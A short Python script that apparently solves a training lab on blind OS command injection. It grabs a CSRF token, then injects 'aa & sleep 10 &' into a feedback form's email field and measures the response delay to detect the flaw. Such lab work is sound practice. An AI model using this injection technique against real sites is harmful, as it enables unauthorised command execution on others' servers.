import requests as r
from bs4 import BeautifulSoup

# Lab: Blind OS command injection with time delays


link = ""


def grab_csrftoken(session_i):
    feedback_link = link + "/feedback"
    get_csrf = session_i.get(feedback_link).text
    response = BeautifulSoup(get_csrf,'html.parser')
    token = response.find('input')["value"]
    print("csrf token : ", token)
    return token

def send_req():

    link_submit_payload= link + "/feedback/submit"
    session_i = r.Session()
    csrf_token = grab_csrftoken(session_i)
    injection = "aa & sleep 10 &"
    
    to_send={"csrf":csrf_token,"name":"nothing","email": injection , "subject":"nothing","message":"nothing" }
    
    myreq = session_i.post(link_submit_payload, data=to_send)
    response=myreq.text
    if myreq.elapsed.total_seconds() >=10:
        print("Vulnerable to command injection !!")
 







if __name__=='__main__':
    send_req()


